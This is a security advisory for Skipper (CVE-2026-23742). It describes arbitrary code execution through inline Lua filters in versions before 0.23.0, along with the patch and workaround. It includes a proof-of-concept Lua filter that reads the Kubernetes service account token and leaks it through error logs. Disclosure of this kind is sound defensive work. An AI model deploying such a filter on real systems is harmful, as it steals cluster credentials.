# Skipper is vulnerable to arbitrary code execution through lua filters

**GHSA**: GHSA-cc8m-98fm-rc9g | **CVE**: CVE-2026-23742 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-94, CWE-250, CWE-522

**Affected Packages**:
- **github.com/zalando/skipper** (go): < 0.23.0

## Description

### Impact

Arbitrary code execution through [lua filters](https://opensource.zalando.com/skipper/reference/scripts/).

The default skipper configuration before v0.23 was `-lua-sources=inline,file`. 
The problem starts if untrusted users can create lua filters, because of `-lua-sources=inline` , for example through a Kubernetes Ingress resource. The configuration `inline` allows these user to create a script that is able to read the filesystem accessible to the skipper process and if the user has access to read the logs they an read skipper secrets.

Kubernetes example (vulnerability is not limited to Kubernetes)
```lua
function request(ctx, params)
  local file = io.open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r')
  if file then
    local token = file:read('*all')
    file:close()
    error('[EXFIL] ' .. token)  -- Exfiltrate via error logs
  end
end
```

### Patches

https://github.com/zalando/skipper/releases/tag/v0.23.0 disables Lua by default.

### Workarounds

You can reduce support of how you can pass lua filter script data by providing config for lua sources https://opensource.zalando.com/skipper/reference/scripts/#enable-and-disable-lua-sources. For example `-lua-sources=file` will only be exploitable if the attacker can create a lua script file on the target system. 

### References

https://opensource.zalando.com/skipper/reference/scripts/#enable-and-disable-lua-sources
